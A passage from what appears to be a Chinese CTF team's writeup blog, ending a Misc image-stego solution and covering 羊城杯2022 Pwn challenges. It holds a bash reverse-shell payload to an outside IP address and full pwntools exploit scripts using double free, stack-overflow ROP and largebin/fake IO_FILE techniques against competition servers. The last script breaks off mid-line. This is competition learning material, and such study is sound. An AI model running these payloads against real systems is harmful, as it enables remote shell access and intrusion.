<p>然后，思路不知道怎么往下走的时候提取了最后三帧图片的RGB值，发现都是只有一个通道，编写脚本将三张图片的RGB通道提出来重新组成一张新的图片：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">img1 = cv2.imread(<span class="string">&#x27;task.dcm_p18.png&#x27;</span>)</span><br><span class="line">r_channel = img1[:, :, <span class="number">0</span>]</span><br><span class="line">img2 = cv2.imread(<span class="string">&#x27;task.dcm_p19.png&#x27;</span>)</span><br><span class="line">g_channel = img2[:, :, <span class="number">1</span>]</span><br><span class="line">img3 = cv2.imread(<span class="string">&#x27;task.dcm_p20.png&#x27;</span>)</span><br><span class="line">b_channel = img3[:, :, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">new_img = np.zeros_like(img1)</span><br><span class="line">new_img[:, :, <span class="number">0</span>] = b_channel</span><br><span class="line">new_img[:, :, <span class="number">1</span>] = g_channel</span><br><span class="line">new_img[:, :, <span class="number">2</span>] = r_channel</span><br><span class="line"></span><br><span class="line">cv2.imwrite(<span class="string">&#x27;flag123.png&#x27;</span>, new_img)</span><br></pre></td></tr></table></figure>
<p><code>zsteg</code>查看LSB隐写：</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/image-20230419221919826.png" alt="image-20230419221919826"></p>
<p>提取出</p>
<p><img src="/2023/04/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2023-%E4%B8%AA%E4%BA%BAWriteup/image-20230419222237979.png" alt="image-20230419222237979"></p>
<p>获取flag：</p>
<p>flag{43159cf6-ff7f-47fc-a199-d14df05b9975}</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>羊城杯2022-Writeup</title>
    <url>/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/</url>
    <content><![CDATA[<h1 id="羊城杯2022writeup"><a class="markdownIt-Anchor" href="#羊城杯2022writeup"></a> 羊城杯2022–Writeup</h1>
<p>​                                                                                                                            -------TWe1v3、1amfree、scr1pt_k1ddi3</p>
<hr>
<p>这个比赛太累了可，凌晨三点碰着枕头就睡着了，不过收获也蛮多的，这次题目很友好，不像wmCTF一样坐大牢。感谢两位大哥的实力带飞，太菜了我。全靠躺。</p>
<span id="more"></span>          
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280.PNG" alt="排行榜"></p>
<h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h2>
<h3 id="ycbsql"><a class="markdownIt-Anchor" href="#ycbsql"></a> YCBSQL</h3>
<p>这个应该是有了非预期，可以直接调用shell，我们直接反弹就行。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1.PNG" alt="1"></p>
<p>Payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">.system bash -c <span class="string">&quot;bash -i  &gt;&amp;/dev/tcp/101.43.255.238/7777 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/2.PNG" alt="2"></p>
<h3 id="ez_linklist-v2"><a class="markdownIt-Anchor" href="#ez_linklist-v2"></a> ez_linklist-v2</h3>
<p>这个题目的漏洞就是在unlink的时候如果是unlink的头指针，那么后面的指针没有清空，就会是这样：</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(3).PNG" alt="1280X1280 (3)"></p>
<p>然后在free函数的时候，如果offset是0xff，那么后面的指针就都能释放掉，因此就会产生double free。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(4).PNG" alt="1280X1280 (4)"></p>
<p>所以实际上就是一个double free的利用。这里我一开始是用的9.7的libc，之后直接改成9.2的就行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r=process(&quot;/home/ubuntu/pwn/比赛/羊城杯/pwn/pwn&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;tcp.dasc.buuoj.cn&quot;</span>,<span class="number">23916</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/pwn/pwn&quot;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/pwn/libc.so.6&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index,offset</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">link</span>(<span class="params">id1,id2</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;link from:&quot;</span>,<span class="built_in">str</span>(id1))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;link to:&quot;</span>,<span class="built_in">str</span>(id2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unlink</span>(<span class="params">index,offset</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x70</span>,p64(<span class="number">0</span>)+p64(<span class="number">0X451</span>))</span><br><span class="line"></span><br><span class="line">link(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">unlink(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0xff</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">link(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">4</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Offset 1:&quot;</span>)</span><br><span class="line">heap_base=u64(r.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x2e0</span></span><br><span class="line">success(<span class="string">&quot;heap_base = &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">link(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">unlink(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x450</span>)+p64(heap_base+<span class="number">0x3b0</span>)</span><br><span class="line">add(<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;z&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">8</span>)+p64(heap_base+<span class="number">0x460</span>)</span><br><span class="line">add(<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line">link(<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">4</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">libc_base=u64(r.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x10</span> -<span class="number">96</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">6</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(free_hook)*<span class="number">3</span></span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">add(<span class="number">0x70</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="fakenooutput"><a class="markdownIt-Anchor" href="#fakenooutput"></a> fakeNoOutput</h3>
<p>这道题目就有点难受，首先是一堆的逆向操作。但是实际上就是一个栈溢出，并且溢出了非常多的字节。但是想要让程序执行到溢出点还是有点的困难。首先我们发现溢出点在upload里面的strcpy(s, haystack);这个部分，然后我们只需要让函数调用upload就可以溢出。但是首先要通过sub_804976F这个函数里面的验证，经过逆向调试发现，就是一个伪随机数，我们直接输入就行。然后溢出的自己大小和Content-Length有较大的关系，因此我们要设置Content-Length的大小来控制溢出的长度。之后由于函数限制的原因，无法ret2libc，因此我们经过精心构造，返回到http_puts函数，然后就能够泄露出got表里的内容，之后再返回主函数再溢出一次就行，就能够拿到shell。让人十分不解的是不知道为什么第二个端口一直打不通，泄露不出来东西，第一个端口多跑两次就能够打通远端。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(5).PNG" alt="1280X1280 (5)"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> execve</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r=process(&quot;/home/ubuntu/pwn/比赛/羊城杯/fakeNoOutput/fakeNoOutput&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;tcp.dasc.buuoj.cn&quot;</span>,<span class="number">20432</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/fakeNoOutput/fakeNoOutput&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/fakeNoOutput/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;POST /upload /  &quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&quot;Content-Length:0x4022\t&quot;</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">payload3=<span class="string">&quot;HTTP_SERVER1_token:wR5qH796Ky8D03r2W7syLB7406e30xP7\t&quot;</span></span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;Content:zzzzfilename=zzzz&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">strlen_got=elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line">strstr_plt=elf.plt[<span class="string">&#x27;strstr&#x27;</span>]</span><br><span class="line"><span class="comment"># payload=(p32(0x804D1a0)+p32(0x8049F77)+p32(0x804D010)).rjust(0x1040,b&#x27;a&#x27;)+p32(0x804D1A0+0x103c-8)+p32(0x80496A8)</span></span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1040</span>+p32(<span class="number">0x804D1A0</span>+<span class="number">0x4000</span>-<span class="number">4</span>)+p32(<span class="number">0x80496A8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x4000</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(<span class="number">0x8049F77</span>)+p32(<span class="number">0x804D010</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base=u32(r.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>)) - libc.symbols[<span class="string">&#x27;strstr&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">execve_addr=libc_base+libc.symbols[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0xcc9ab</span></span><br><span class="line">gadget2=<span class="number">0x145f43</span></span><br><span class="line">gadget3=<span class="number">0x145f44</span></span><br><span class="line">one_gadget=libc_base+gadget1</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;POST /upload /  &quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&quot;Content-Length:0xece\t&quot;</span></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">payload3=<span class="string">&quot;HTTP_SERVER1_token:5lnPP74OkC4N9U8smBU812Smk1XxvRBJ\t&quot;</span></span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.send(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;Content:zzzzfilename=zzzz&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xe9c</span>+p32(execve_addr)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="dream"><a class="markdownIt-Anchor" href="#dream"></a> Dream</h3>
<p>说是dream，实际上就是一个largebin attack，然后UAF漏洞，函数功能还都比较齐全。主要是开启了沙箱不能拿到shell，并且show函数里面有一个加密的过程，想要泄露数据必须要完成逆向，之后我们直接利用qwb里面house of cat的做法，一次largebin attack攻击malloc assert即可实现orw读取flag并泄露。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280(6).PNG" alt="1280X1280(6)"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r=process(&quot;/home/ubuntu/pwn/比赛/羊城杯/dream/dream&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;tcp.dasc.buuoj.cn&quot;</span>,<span class="number">26422</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/dream/dream&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/glibc-all-in-one/libs/2.32-0ubuntu3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;choice: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Give me a dream ID: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;how long: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;dream: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which dream to wake?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which dream do you want to show?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Which dream to make?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendafter(<span class="string">&quot;dream: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">payload,<span class="built_in">len</span></span>):</span><br><span class="line">   key = [<span class="number">9</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">7</span>]</span><br><span class="line">   v9 = <span class="number">52</span> // <span class="built_in">len</span> + <span class="number">6</span></span><br><span class="line">   delta = <span class="number">0</span></span><br><span class="line">   delta -= v9 * <span class="number">0x61C88647</span></span><br><span class="line">   delta &amp;= <span class="number">0xffffffff</span></span><br><span class="line">   bk = payload[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span>(v9):</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>)[::-<span class="number">1</span>]:</span><br><span class="line">         fd = payload[i - <span class="number">1</span>]</span><br><span class="line">         payload[i] -= (((<span class="number">8</span> * bk) ^ (fd &gt;&gt; <span class="number">7</span>)) + ((bk &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * fd))) ^ ((bk ^ delta) + (fd ^ key[((delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) ^ i &amp; <span class="number">3</span>]))</span><br><span class="line">         payload[i] &amp;= <span class="number">0xffffffff</span></span><br><span class="line">         bk = payload[i]</span><br><span class="line">      i -= <span class="number">1</span></span><br><span class="line">      fd = payload[<span class="built_in">len</span> - <span class="number">1</span>]</span><br><span class="line">      payload[<span class="number">0</span>] -= (((<span class="number">8</span> * bk) ^ (fd &gt;&gt; <span class="number">7</span>)) + ((bk &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * fd))) ^ ((bk ^ delta) + (fd ^ key[((delta &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) ^ i &amp; <span class="number">3</span>]))</span><br><span class="line">      payload[<span class="number">0</span>] &amp;= <span class="number">0xffffffff</span></span><br><span class="line">      bk = payload[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">      delta += <span class="number">0x61C88647</span></span><br><span class="line">      delta &amp;= <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">      v9-=<span class="number">1</span></span><br><span class="line">   <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x420</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x400</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x410</span>,<span class="string">&quot;c&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payloads=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x420</span>//<span class="number">4</span>):</span><br><span class="line">    payloads.append(<span class="built_in">int</span>.from_bytes(r.recv(<span class="number">4</span>), <span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">payloads=de(payloads,<span class="number">0x420</span>//<span class="number">4</span>)</span><br><span class="line">main_arena=(payloads[<span class="number">0</span>]+(payloads[<span class="number">1</span>]&lt;&lt;<span class="number">32</span>)) - <span class="number">96</span></span><br><span class="line">libc_base=main_arena - <span class="number">0x10</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">stderr_addr=libc_base+libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">set_context=libc_base+libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payloads1=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400</span>//<span class="number">4</span>):</span><br><span class="line">    payloads1.append(<span class="built_in">int</span>.from_bytes(r.recv(<span class="number">4</span>), <span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">payloads1=de(payloads1,<span class="number">0x400</span>//<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">heap_base=(payloads1[<span class="number">2</span>]+(payloads1[<span class="number">3</span>]&lt;&lt;<span class="number">32</span>)) - <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;heap_base = &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">payload=p64(main_arena+<span class="number">96</span>)*<span class="number">2</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x410</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(heap_base&gt;&gt;<span class="number">12</span>)+p64(heap_base+<span class="number">0x10</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0x400</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>,<span class="string">&quot;d&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stderr_addr - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x4f0</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x430</span>,<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x438</span>+p64(<span class="number">0x70</span>)</span><br><span class="line">edit(<span class="number">4</span>,payload)</span><br><span class="line"></span><br><span class="line">fake_io_addr=heap_base+<span class="number">0xad0</span> </span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(heap_base)         </span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(heap_base+<span class="number">0xee0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)</span><br><span class="line">fake_IO_FILE +=p64(set_context)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x58</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>) </span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x1000</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libc_base+<span class="number">0x1e4f80</span>+<span class="number">0x10</span>)</span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_FILE)</span><br><span class="line"></span><br><span class="line">shellcode_addr=heap_base+<span class="number">0xee0</span>+<span class="number">0x300</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line"></span><br><span class="line">frame.rsp = shellcode_addr+<span class="number">0x20</span></span><br><span class="line">frame.rdi = heap_base</span><br><span class="line">frame.rsi = <span class="number">0x10000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">frame.rip = libc_base+libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">code = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">code += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="string">&#x27;rsp&#x27;</span>,<span class="number">0x50</span>)</span><br><span class="line">code += shellcraft.write(<span class="number">1</span>, <span 